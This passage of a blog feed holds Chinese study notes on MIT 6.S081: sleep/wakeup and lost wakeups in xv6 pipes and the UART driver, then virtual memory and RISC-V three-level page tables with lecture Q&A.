HBwSGN6aDJCbkRnXzE2OTY1NzQ2OTE6MTY5NjU3ODI5MV9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>所以会出现lostwakeup，是因为在一个不同的CPU核上可能有另一个线程刚刚调用了pipewrite:</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NzUyOTJiMmU3MjZkOTE0YzNhODBiMTJlMmVhZDE0N2RfcTY2YWJZeEZnWHBxcTZlb2w5NlJIWUJrZ24wNkdGQzFfVG9rZW46R0UwVmJSQWFQb3dES2V4T2dyemNBS280bnFiXzE2OTY1NzQ2OTE6MTY5NjU3ODI5MV9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pipewrite会向pipe的缓存写数据，并最后在piperead所等待的sleepchannel上调用wakeup。而我们想要避免这样的风险：在piperead函数检查发现没有字节可以读取，到piperead函数调用sleep函数之间，另一个CPU调用了pipewrite函数。因为这样的话，另一个CPU会向pipe写入数据并在piperead进程进入SLEEPING之前调用wakeup，进而产生一次lostwakeup。</p><p>在pipe的代码中，pipewrite和piperead都将sleep包装在一个while循环中。piperead中的循环等待pipe的缓存为非空（pipewrite中的循环等待的是pipe的缓存不为full）。之所以要将sleep包装在一个循环中，是因为可能有多个进程在读取同一个pipe。如果一个进程向pipe中写入了一个字节，这个进程会调用wakeup进而同时唤醒所有在读取同一个pipe的进程。但是因为pipe中只有一个字节并且总是有一个进程能够先被唤醒，哦，这正好提醒了我有关sleep我忘记了一些非常关键的事情。sleep函数中最后一件事情就是重新获取conditionlock。所以调用sleep函数的时候，需要对conditionlock上锁（注，在sleep函数内部会对conditionlock解锁），在sleep函数返回时会重新对conditionlock上锁。这样第一个被唤醒的线程会持有conditionlock，而其他的线程在重新对conditionlock上锁的时候会在锁的acquire函数中等待。</p><p>那个幸运的进程（注，这里线程和进程描述的有些乱，但是基本意思是一样的，当说到线程时是指进程唯一的内核线程）会从sleep函数中返回，之后通过检查可以发现pi-&gt;nwrite比pi-&gt;nread大1，所以进程可以从piperead的循环中退出，并读取一个字节，之后pipe缓存中就没有数据了。之后piperead函数释放锁并返回。接下来，第二个被唤醒的线程，它的sleep函数可以获取conditionlock并返回，但是通过检查发现pi-&gt;nwrite等于pi-&gt;nread（注，因为唯一的字节已经被前一个进程读走了），所以这个线程以及其他所有的等待线程都会重新进入sleep函数。所以这里也可以看出，几乎所有对于sleep的调用都需要包装在一个循环中，这样从sleep中返回的时候才能够重新检查condition是否还符合。</p><p>sleep和wakeup的规则稍微有点复杂。因为你需要向sleep展示你正在等待什么数据，你需要传入锁并遵循一些规则，某些时候这些规则还挺烦人的。另一方面sleep和wakeup又足够灵活，因为它们并不需要理解对应的condition，只是需要有个condition和保护这个condition的锁。</p><p>除了sleep&amp;wakeup之外，还有一些其他的更高级的Coordination实现方式。例如今天课程的阅读材料中的semaphore，它的接口就没有那么复杂，你不用告诉semaphore有关锁的信息。而semaphore的调用者也不需要担心lostwakeup的问题，在semaphore的内部实现中考虑了lostwakeup问题。因为定制了up-down计数器，所以semaphore可以在不向接口泄露数据的同时（注，也就是不需要向接口传递conditionlock），处理lostwakeup问题。semaphore某种程度来说更简单，尽管它也没那么通用，如果你不是在等待一个计数器，semaphore也就没有那么有用了。这也就是为什么我说sleep和wakeup更通用的原因。</p><p>像锁一样，sleep是另一种帮助程序线性化的工具</p><p>场景：</p><ol type="1"><li>等待管道有数据</li><li>等待磁盘读取完成</li><li>wait系统调用，等待子进程完成某个事件</li></ol><p>以软件的形式简单模拟：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Busy</span> <span class="hljs-attr">wait</span>:<br>        <span class="hljs-keyword">while</span> pipe buf is empty &#123;&#125; <span class="hljs-comment">// 这样cpu空转，浪费cpu资源，最好的做法是类似swtch一样学会放弃cpu，直到某个事件发生，才重新拥有cpu控制权，sleep和wakeup就是做这件事情的</span><br>        <span class="hljs-keyword">return</span> the data<br></code></pre></td></tr></table></figure><p>改写的UART的驱动代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">uartwrite (char buf[], int n) &#123;<br><span class="hljs-comment">// 驱动——处理输入，写入控制台的函数，写入硬件，每次一个字符one by one，由于uart每次只能写入一个字符，但实际情况一般是有很多字符，所以需要等待uart硬件处理完了，才继续发送下一个字符</span><br><span class="hljs-keyword">while</span> (i &lt; n) &#123;  <span class="hljs-comment">// buf size是16，每16个字符就有一次中断</span><br>        <span class="hljs-keyword">while</span> (tx_done == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 表明硬件还没准备好</span><br>                <span class="hljs-title function_">sleep</span>(&amp;tx_chan, &amp;uart_tx_lock); <span class="hljs-comment">// 硬件没准备好，就去睡觉，不要占着茅坑不拉屎</span><br>        &#125;<br>        <span class="hljs-comment">// 否则硬件已经准备好了</span><br>        <span class="hljs-title class_">WriteReg</span>(<span class="hljs-variable constant_">THR</span>, buf[i]) <span class="hljs-comment">// buf是缓冲区的字符集，THR是硬件的传输寄存器</span><br>        i += <span class="hljs-number">1</span>;<br>        tx+ done = <span class="hljs-number">0</span> <span class="hljs-comment">// 重置状态</span><br>&#125;<br>&#125;<br><br><span class="hljs-title function_">uartintr</span>() <span class="hljs-comment">// 驱动——处理中断</span><br>&#123;<br>    <span class="hljs-title function_">acquire</span>(&amp;uart_tx_lock)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">ReadReg</span>(<span class="hljs-variable constant_">LSR</span>) &amp; <span class="hljs-variable constant_">LSR_TX_IDLE</span>) &#123; <span class="hljs-comment">// 硬件读取完成读取当前字符</span><br>            tx_done = <span class="hljs-number">1</span>; <span class="hljs-comment">// 重置状态为1</span><br>            <span class="hljs-title function_">wakeup</span>(&amp;tx_chan); <span class="hljs-comment">// 唤醒uartwrite，uartwrite重新掌握cou控制权</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="wakeup-lost-wakeup原理">Wakeup &amp; lost wakeup原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">broken_sleep</span>(<span class="hljs-params">channel</span>) &#123;<br>        p -&gt; state = <span class="hljs-variable constant_">SLEEPING</span>;<br>        p-&gt;channel = channel<br>        <span class="hljs-title function_">swtch</span>()<br>&#125;<br><br><span class="hljs-title function_">wakeup</span>(<span class="hljs-params">channel</span>) &#123;<br>        <span class="hljs-keyword">for</span> each p <span class="hljs-keyword">in</span> procs[] &#123;<br>                <span class="hljs-keyword">if</span> (p -&gt;state == <span class="hljs-variable constant_">SLEEPING</span> &amp;&amp; p -&gt; channel == channel) &#123;<br>                        p-&gt;state = <span class="hljs-variable constant_">RUNNABLE</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么要有channel呢？没有行不行？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">int done<br><span class="hljs-title function_">uartwrite</span>(<span class="hljs-params">buf</span>) &#123;<br>        <span class="hljs-keyword">for</span> each c <span class="hljs-keyword">in</span> buf &#123;<br>                <span class="hljs-title class_">Lock</span><br>                <span class="hljs-keyword">while</span> not done &#123;<br>                        <span class="hljs-title function_">sleep</span>(&amp;tx_chan)<br>                &#125;<br>                send c<br>                done<br>                unLock<br>        &#125;<br>&#125;<br><br><span class="hljs-title function_">intr</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Lock</span><br>        done = <span class="hljs-number">1</span><br>        <span class="hljs-title function_">wakeup</span>(&amp;tx_chan)<br>        unLock<br>&#125;<br>两个例程必须含锁，因为有一个共享数据结构buf；另外它们还共同访问同一个硬件，为了避免竞态条件，必须使用锁。锁加在哪里呢？<br>上面代码会导致死锁，因为中断触发的时候又加了一次锁，导致never wake up<br><br>所以一种解决办法是在sleep之前unlock，这样中断例程就有机会去执行代码，然后wakeup，再在sleep之后acquire，放在在执行write的时候其他进程影响：<br><br><span class="hljs-title function_">uartwrite</span>(<span class="hljs-params">buf</span>) &#123;<br>        <span class="hljs-keyword">for</span> each c <span class="hljs-keyword">in</span> buf &#123;<br>                <span class="hljs-title class_">Lock</span><br>                <span class="hljs-keyword">while</span> not done &#123;<br>                        unLock<br>                        <span class="hljs-title function_">sleep</span>(&amp;tx_chan)<br>                        <span class="hljs-title class_">Lock</span><br>                &#125;<br>                send c<br>                done<br>                unLock<br>        &#125;<br>&#125;<br><br>事实上教授的演示里，是多个核心的，其他核心上确实发生了中断，但是中断发生的时候还没有执行到broken_sleep的线程切换，这就会导致wakeup的时候，并没有唤醒任何东西；然后后面才sleep，这就是所谓的wakeup lost问题<br><br>但是有时候wakeup lost会意外地修复自己？<br>因为这里uart只有一个中断例程，无论是信号输入还是信号完成输出，所以当教授重新键入的时候，触发信号输入，触发中断，会重新wakeup，可能帮助之前的丢失的sleep wakeup了<br><br><br>那sleep到底如何实现呢？<br>出现上面<span class="hljs-keyword">case</span>的本质原因是release之后，sleep的操作不是原子性的，导致了会被中断，有没有一直方法让broken_sleep成为原子性的？<br>加另一把锁：<br><br>broken_sleep（chan） &#123;<br>    <span class="hljs-keyword">if</span> (lk != &amp;p-&gt;lock) &#123;<br>            <span class="hljs-title function_">acquire</span>(&amp;p-&gt;lock); <span class="hljs-comment">// 另一把锁，这里直接用了进程锁</span><br>            unLock; <span class="hljs-comment">// 同时释放之前的条件锁，这个时候中断进程可以执行wakeup了，但是由于wakeup的时候，又被进程锁拦截了，导致没办法立即恢复运行，所以就等待了</span><br>    &#125;<br>    <span class="hljs-comment">// Go to sleep</span><br>    p-chan = chan<br>    p-&gt;state = <span class="hljs-variable constant_">SLEEPING</span><br>    <br>    <span class="hljs-title function_">sched</span>() =&gt; 切换到调度器线程schedule的时候，会释放最近一次的运行的进程锁，<br>    <br>    p-&gt;chan = <span class="hljs-number">0</span>; <span class="hljs-comment">// 下一次wake up的时候从这里开始</span><br>    <br>    <span class="hljs-keyword">if</span> (lk != &amp;p-&gt;lock) &#123;<br>            <span class="hljs-title function_">release</span>(&amp;p-&gt;lock);<br>            <span class="hljs-title class_">Lock</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Virtual Memory and Page Table</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/virtual-memory&amp;page-table/main/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/virtual-memory&amp;page-table/main/</url>
    
    <content type="html"><![CDATA[<p>内存分配：由proc.h里的freerange函数管理，以链表的形式进行管理</p><h3 id="地址空间addr-space">地址空间(Addr space)</h3><p>在RISC-V主板上，内存是由一些DRAM芯片组成。在这些DRAM芯片中保存了程序的数据和代码。例如内存中的某一个部分是内核，包括了文本，数据，栈等等；如果运行了Shell，内存中的某个部分就是Shell；如果运行了cat程序，内存中的某个部分是cat程序。这里说的都是物理内存，它的地址从0开始到某个大的地址结束。结束地址取决于我们的机器现在究竟有多少物理内存。所有程序都必须存在于物理内存中，否则处理器甚至都不能处理程序的指令。如果不做任何处理默认将会是下面这样:</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YWMzODc1NTU0N2RlODg5MDkyOWVmZTJlZGI0NmUxOTJfTXo2YU54QWZSRHh6UHpTR090Q1VFQ0h2OUcyR2dRMnhfVG9rZW46SFZyamJTNzBHb2ppTzl4dENJV2N0aEFYbnBjXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里假设Shell存在于内存地址1000-2000之间。如果cat出现了程序错误，将内存地址1000，也就是Shell的起始地址加载到寄存器a0中。之后执行<em><code>sd $7, (a0)</code></em><code>，</code>这里等效于将7写入内存地址1000。</p><p>现在cat程序弄乱了Shell程序的内存镜像，所以隔离性被破坏了，这是我们不想看到的现象。所以，我们想要某种机制，能够将不同程序之间的内存隔离开来，这样类似的事情就不会发生。一种实现方式是地址空间（AddressSpaces）。</p><p>这里的基本概念也很简单直观，我们给包括内核在内的所有程序专属的地址空间。所以，当我们运行cat时，它的地址空间从0到某个地址结束。当我们运行Shell时，它的地址也从0开始到某个地址结束。内核的地址空间也从0开始到某个地址结束。如下：</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NTg5NGQ1MjBmOTRkZDk1ZDgyMTU5MzE2MjU0YmViMjFfYWtTcFJLUmN3VTdNcEM2TDVMbGxZQWQ0d1hwMDdRZXJfVG9rZW46WU5pVGI0TU1xbzhuc3h4dlVJSmM0SnEzbkNUXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YmJlOGFlNjRiZTE4YTRlZTkxYjU5MWMyMzZjOWM4OWJfc3NJb0xPVUlmb0JTQktjalljMmd6WlJqWkFESk42U05fVG9rZW46SFg0c2JwZ2dpb3ZJOVV4c09LRmNZVkNjblNnXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>如果cat程序想要向地址1000写入数据，那么cat只会向它自己的地址1000，而不是Shell的地址1000写入数据。所以，基本上来说，每个程序都运行在自己的地址空间，并且这些地址空间彼此之间相互独立。在这种不同地址空间的概念中，cat程序甚至都不具备引用属于Shell的内存地址的能力。这是我们想要达成的终极目标，因为这种方式为我们提供了强隔离性，cat现在不能引用任何不属于自己的内存。</p><p>所以现在我们的问题是如何在一个物理内存上，创建不同的地址空间，因为归根到底，我们使用的还是一堆存放了内存信息的DRAM芯片。</p><blockquote><p>学生提问：我比较好奇物理内存的配置，因为物理内存的数量是有限的，而虚拟地址空间存在最大虚拟内存地址，但是会有很多个虚拟地址空间，所以我们在设计的时候需要将最大虚拟内存地址设置的足够小吗？</p><p>Frans教授：并不必要，虚拟内存可以比物理内存更大，物理内存也可以比虚拟内存更大。我们马上就会看到这里是如何实现的，其实就是通过pagetable来实现，这里非常灵活。</p><p>同一个学生继续问：如果有太多的进程使用了虚拟内存，有没有可能物理内存耗尽了？</p><p>Frans教授：这必然是有可能的。我们接下来会看到如果你有一些大的应用程序，每个程序都有大的pagetable，并且分配了大量的内存，在某个时间你的内存就耗尽了。</p><p>Frans教授提问：大家们，在XV6中从哪可以看到内存耗尽了？如果你们完成了syscall实验，你们会知道在syscall实验中有一部分是打印剩余内存的数量。</p><p>学生回答：kalloc？</p><p>Frans教授：是的，kalloc。kalloc保存了空余page的列表，如果这个列表为空或者耗尽了，那么kalloc会返回一个空指针，内核会妥善处理并将结果返回给用户应用程序。并告诉用户应用程序，要么是对这个应用程序没有额外的内存了，要么是整个机器都没有内存了。</p><p>内核的一部分工作就是优雅的处理这些情况，这里的优雅是指向用户应用程序返回一个错误消息，而不是直接崩溃</p></blockquote><h3 id="page-table">Page Table</h3><p>我们如何能够实现地址空间呢？或者说如何在一个物理内存上，创建不同的地址空间？</p><p>最常见的方法，<strong>同时也是非常灵活的一种方法就是使用页表（PageTables）</strong>。页表是在硬件中通过处理器和<strong>内存管理单元（MemoryManagementUnit）</strong>实现。所以，在你们的脑海中，应该有这么一张图：CPU正在执行指令，例如<em>sd$7, (a0)。</em></p><p>对于任何一条带有地址的指令，其中的地址应该认为是虚拟内存地址而不是物理地址。假设寄存器a0中是地址0x1000，那么这是一个虚拟内存地址。虚拟内存地址会被转到内存管理单元（MMU，MemoryManagement Unit）</p><p>内存管理单元会将虚拟地址翻译成物理地址。之后这个物理地址会被用来索引物理内存，并从物理内存加载，或者向物理内存存储数据。</p><p>从CPU的角度来说，一旦MMU打开了，它执行的每条指令中的地址都是虚拟内存地址。</p><p>为了能够完成虚拟内存地址到物理内存地址的翻译，MMU会有一个表单，表单中，一边是虚拟内存地址，另一边是物理内存地址。举个例子，虚拟内存地址0x1000对应了一个我随口说的物理内存地址0xFFF0。</p><p>通常来说，内存地址对应关系的表单也保存在内存中。所以CPU中需要有一些寄存器用来存放表单在物理内存中的地址。现在，在内存的某个位置保存了地址关系表单，我们假设这个位置的物理内存地址是0x10。那么在RISC-V上一个叫做<strong>SATP的寄存器</strong>会保存地址0x10。</p><blockquote><p>学生提问：所以MMU并不会保存page table，它只会从内存中读取pagetable，然后完成翻译，是吗？</p><p>Frans教授：是的，这就是你们应该记住的。pagetable保存在内存中，MMU只是会去查看page table，我们接下来会看到，pagetable比我们这里画的要稍微复杂一些。</p></blockquote><p>这里的基本想法是<strong>每个应用程序都有自己独立的表单，并且这个表单定义了应用程序的地址空间。所以当操作系统将CPU从一个应用程序切换到另一个应用程序时，同s时也需要切换SATP寄存器中的内容，从而指向新的进程保存在物理内存中的地址对应表单</strong>。这样的话，cat程序和Shell程序中相同的虚拟内存地址，就可以翻译到不同的物理内存地址，因为每个应用程序都有属于自己的不同的地址对应表单。</p><blockquote><p>学生提问：刚刚说到SATP寄存器会根据进程而修改，我猜每个进程对应的SATP值是由内核保存的？</p><p>Frans教授：是的。内核会写SATP寄存器，写SATP寄存器是一条特殊权限指令。所以，用户应用程序不能通过更新这个寄存器来更换一个地址对应表单，否则的话就会破坏隔离性。所以，只有运行在kernelmode的代码可以更新这个寄存器。</p></blockquote><p>有一些需要思考的点，SATP指向的内存应该有多大？如果说虚拟地址和物理地址是一对一的关系，那么光是存储这种表就耗尽内存了。所以，实际情况不可能是一个虚拟内存地址对应pagetable中的一个条目。实际上是按照层级的方式来分配虚拟地址和物理地址之间的关系</p><p><strong>第一步：不要为每个地址创建一条表单条目（不要以单个物理地址的维度创建虚拟地址），而是为每个page创建一条表单条目（以页为维度创建虚拟地址），所以每一次地址翻译都是针对一个page。而RISC-V中，一个page是4KB，也就是4096Bytes。这个大小非常常见，几乎所有的处理器都使用4KB大小的page或者支持4KB大小的page。</strong></p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NWUzMDM1MWUzYzZiOTc2NzUxZTc2MjM1ODRlYzZiMjVfVlVVSlNIbWtIdVNwZk1ka28zM0R2cmhtUXBDVjUwMDJfVG9rZW46VzQ3Z2JxbVFib29UcVV4RXA5OWNoRlBQbmRjXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>内存地址的翻译方式略微的不同了。首先对于虚拟内存地址，我们将它划分为两个部分，index和offset，index用来查找page，offset对应的是一个page中的哪个字节。</p><p>Index: which Page</p><p>Offset: which address on certain page</p><p>当MMU在做地址翻译的时候，通过读取虚拟内存地址中的index可以知道物理内存中的page号，这个page号对应了物理内存中的4096个字节。之后虚拟内存地址中的offset指向了page中的4096个字节中的某一个，假设offset是12，那么page中的第12个字节被使用了。将offset加上page的起始地址，就可以得到物理内存地址。</p><p>有关RISC-V的一件有意思的事情是，虚拟内存地址都是64bit，这也说的通，因为RISC-V的寄存器是64bit的。但是实际上，在我们使用的RSIC-V处理器上，并不是所有的64bit都被使用了，也就是说高25bit并没有被使用。这样的结果是限制了虚拟内存地址的数量，虚拟内存地址的数量现在只有2^39个，大概是512GB。当然，如果必要的话，最新的处理器或许可以支持更大的地址空间，只需要将未使用的25bit拿出来做为虚拟内存地址的一部分即可。</p><p>在剩下的39bit中，有27bit被用来当做index，12bit被用来当做offset。offset必须是12bit，因为对应了一个page的4096个字节。</p><p>在RISC-V中，物理内存地址是56bit。所以物理内存可以大于单个虚拟内存地址空间，但是也最多到2<sup>56。大多数主板还不支持2</sup>56这么大的物理内存，但是原则上，如果你能造出这样的主板，那么最多可以支持2^56字节的物理内存。</p><p>物理内存地址是56bit，其中44bit是物理page号（PPN，Physical PageNumber），剩下12bit是offset完全继承自虚拟内存地址（也就是地址转换时，只需要将虚拟内存中的27bit翻译成物理内存中的44bit的page号，剩下的12bitoffset直接拷贝过来即可）。</p><blockquote><p>学生提问：我想知道4096字节作为一个page，这在物理内存中是连续的吗？</p><p>Frans教授：是的，在物理内存中，这是连续的4096个字节。所以物理内存是以4096为粒度使用的。</p><p>同一个学生：所以offset才是12bit，这样就足够覆盖4096个字节？</p><p>Frans教授：是的，page中的每个字节都可以被offset索引到。</p><p>同一个学生：图中的56bit又是根据什么确定的？</p><p>Frans教授：这是由硬件设计人员决定的。所以RISC-V的设计人员认为56bit的物理内存地址是个不错的选择。可以假定，他们是通过技术发展的趋势得到这里的数字。比如说，设计是为了满足5年的需求，可以预测物理内存在5年内不可能超过2<sup>56这么大。或许，他们预测是的一个小得多的数字，但是为了防止预测错误，他们选择了像2</sup>56这么大的数字。这里说的通吗？很多同学都问了这个问题。</p><p>学生提问：如果虚拟内存最多是2<sup>27（最多应该是2</sup>39），而物理内存最多是2^56，这样我们可以有多个进程都用光了他们的虚拟内存，但是物理内存还有剩余，对吗？</p><p>Frans教授：是的，完全正确。</p><p>学生提问：因为这是一个64bit的机器，为什么硬件设计人员本可以用64bit但是却用了56bit？</p><p>Frans教授：选择56bit而不是64bit是因为在主板上只需要56根线。</p><p>学生提问：我们从CPU到MMU之后到了内存，但是不同的进程之间的怎么区别？比如说Shell进程在地址0x1000存了一些数据，ls进程也在地址0x1000也存了一些数据，我们需要怎么将它们翻译成不同的物理内存地址。</p><p>Frans教授：SATP寄存器包含了需要使用的地址转换表的内存地址。所以ls有自己的地址转换表，cat也有自己的地址转换表。每个进程都有完全属于自己的地址转换表</p></blockquote><p>通过上面这一步，我们现在是的地址转换表是以page为粒度，而不是以单个内存地址为粒度，现在这个地址转换表已经可以被称为pagetable了。但是目前的设计还不能满足实际的需求。</p><p>这个pagetable最多会有2^27个条目（虚拟内存地址中的index长度为27），这是个非常大的数字。如果每个进程都使用这么大的pagetable，进程需要为pagetable消耗大量的内存，并且很快物理内存就会耗尽。</p><p>上面这种方案里，每个进程是的转换表大小为2<sup>27次方，对应可包括的空间范围是2</sup>27* 4096(bytes)，对应的进程大小是2 ^ 27 = 128 M</p><p>所以实际上，硬件并不是按照这里的方式来存储pagetable。从概念上来说，你可以认为pagetable是从0到2^27，但是实际上并不是这样。实际中，pagetable是一个多级的结构。下图是一个真正的RISC-V pagetable结构和硬件实现</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTBjNmRhYWU4YTg2OWZjZmMxNjhiZGFiYWUyZGM2YTRfbWZuVTNSUUsxdUxNalM4NUt6Rlh5bjU5eWk3Z0tmZndfVG9rZW46QUlZNmJHellyb0xZRml4OURVaWNHQjVDbmxiXzE2OTY1NzQ5MjA6MTY5NjU3ODUyMF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>我们之前提到的虚拟内存地址中的27bit的index，实际上是由3个9bit的数字组成（L2，L1，L0）。前9个bit被用来索引最高级的pagedirectory（注：通常page directory是用来索引page table或者其他pagedirectory物理地址的表单，但是在课程中，page table，page directory， pagedirectorytable区分并不明显，可以都认为是有相同结构的地址对应表单）。</p><p>一个directory是4096Bytes，就跟page的大小是一样的(512 * 8,8是地址的大小)。Directory中的一个条目被称为PTE（Page TableEntry）是64bits，就像寄存器的大小一样，也就是8Bytes。所以一个Directorypage有512个条目。</p><p>这种方式每个进程的索引表大小是3<em>4096，条目是3</em>512，对应的进程大小是512* 512 * 512 * 4096 = 2^39 = 2 ^ 7 * 2 ^ 20 = 128 M</p><p>所以实际上，SATP寄存器会指向最高一级的pagedirectory的物理内存地址，之后我们用虚拟内存中index的高9bit用来索引最高一级的pagedirectory，这样我们就能得到一个PPN，也就是物理page号。这个PPN指向了中间级的pagedirectory。</p><p>当我们在使用中间级的pagedirectory时，我们通过虚拟内存地址中的L1部分完成索引。接下来会走到最低级的pagedirectory，我们通过虚拟内存地址中的L0部分完成索引。在最低级的pagedirectory中，我们可以得到对应于虚拟内存地址的物理内存地址。</p><p>从某种程度上来说，与之前一种方案还是很相似的，除了实际的索引是由3步，而不是1步完成。这种方式的主要优点是，如果地址空间中大部分地址都没有使用，你不必为每一个index准备一个条目。举个例子，如果你的地址空间只使用了一个page，4096Bytes。</p><p>除此之外，你没有使用任何其他的地址。现在，你需要多少个page tableentry，或者page table directory来映射这一个page？</p><p>在最高级，你需要一个page directory。在这个pagedirectory中，你需要一个数字是0的PTE，指向中间级pagedirectory。所以在中间级，你也需要一个pagedirectory，里面也是一个数字0的PTE，指向最低级pagedirectory。所以这里总共需要3个page directory（也就是3 *512个条目）。</p><p>而在前一个方案中，虽然我们只使用了一个page，还是需要2^27个PTE。这个方案中，我们只需要3* 512个PTE。所需的空间大大减少了。这是实际上硬件采用这种层次化的3级pagedirectory结构的主要原因。</p><p><strong>PPN的保留位</strong></p><p>如果你把44bit的PPN和10bit的Flags相加是54bit，也就是说还有10bit未被使用，这10bit被用来作为未来扩展。比如说某一天你有了一个新的RISC-V处理器，它的pagetable可能略有不同，或许有超过44bit的PPN。如果你看下面这张图，你可以看到，这里有10bit是作为保留字段存在的。</p><p>接下来，让我们看看PTE中的Flag，因为它也很重要。每个PTE的低10bit是一堆标志位：</p><ul><li>第一个标志位是Valid。如果Validbit位为1，那么表明这是一条合法的PTE，你可以用它来做地址翻译。对于刚刚举得那个小例子（应用程序只用了1个page的例子），我们只使用了3个pagedirectory，每个pagedirectory中只有第0个PTE被使用了，所以只有第0个PTE的Validbit位会被设置成1，其他的511个PTE的Validbit为0。这个标志位告诉MMU，你不能使用这条PTE，因为这条PTE并不包含有用的信息。</li><li>下两个标志位分别是Readable和Writable。表明你是否可以读/写这个page。</li><li>Executable表明你可以从这个page执行指令。</li><li>User表明这个page可以被运行在用户空间的进程访问。</li><li>其他标志位并不是那么重要，他们偶尔会出现，前面5个是重要的标志位。</li></ul><blockquote><p>学生提问：我对于这里的3个pagetable有个问题。PPN是如何合并成最终的物理内存地址？</p><p>Frans教授：我之前或许没有很直接的说这部分（其实是有介绍的）。在最高级的pagedirectory中的PPN，包含了下一级pagedirectory的物理内存地址，依次类推。在最低级pagedirectory，我们还是可以得到44bit的PPN，这里包含了我们实际上想要翻译的物理page地址，然后再加上虚拟内存地址的12bitoffset，就得到了56bit物理内存地址。</p><p>Frans教授：让我来问自己的一个有趣的问题，为什么是PPN存在这些pagedirectory中？为什么不是一个虚拟内存地址？</p><p>某学生回答：因为我们需要在物理内存中查找下一个pagedirectory的地址。</p><p>Frans教授：是的，我们不能让我们的地址翻译依赖于另一个翻译，否则我们可能会陷入递归的无限循环中。所以pagedirectory必须存物理地址。那SATP呢？它存的是物理地址还是虚拟地址？</p><p>某学生回答：还是物理地址，因为最高级的pagedirectory还是存在物理内存中，对吧。</p><p>Frans教授：是的，这里必须是物理地址，因为我们要用它来完成地址翻译，而不是对它进行地址翻译。所以SATP需要知道最高一级的pagedirectory的物理地址是什么。</p><p>学生提问： 这里有层次化的3个page table，每个pagetable都由虚拟地址的9个bit来索引，所以是由虚拟地址中的3个9bit来分别索引3个pagetable，对吗？</p><p>Frans教授：是的，最高的9个bit用来索引最高一级的pagedirectory，第二个9bit用来索引中间级的pagedirectory，第三个9bit用来索引最低级的page 